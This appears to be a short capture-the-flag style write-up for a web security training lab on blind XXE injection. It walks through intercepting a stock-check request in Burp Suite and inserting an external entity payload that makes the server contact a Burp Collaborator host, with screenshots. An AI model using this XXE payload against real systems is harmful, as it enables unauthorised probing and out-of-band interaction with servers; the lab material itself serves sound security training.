![image](https://github.com/udayk01/Web-Security/assets/52235763/32348666-3950-4cd4-9863-e535f3b493d4)

## Solution:

> Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

![image](https://github.com/udayk01/Web-Security/assets/52235763/01df28a0-a5d5-46c1-84c6-a786959ef902)

> Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

```<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>```

>> Replace the productId number with a reference to the external entity:

```&xxe;```

![image](https://github.com/udayk01/Web-Security/assets/52235763/d19b38b8-3f61-4c9f-ac5b-a08d26562fc4)

> Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

![image](https://github.com/udayk01/Web-Security/assets/52235763/52ef42e3-dc98-44f0-9e8b-adf0e3e7c13e)

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/bce46d7e-a7f9-4b4f-952e-9f4201cfa039)
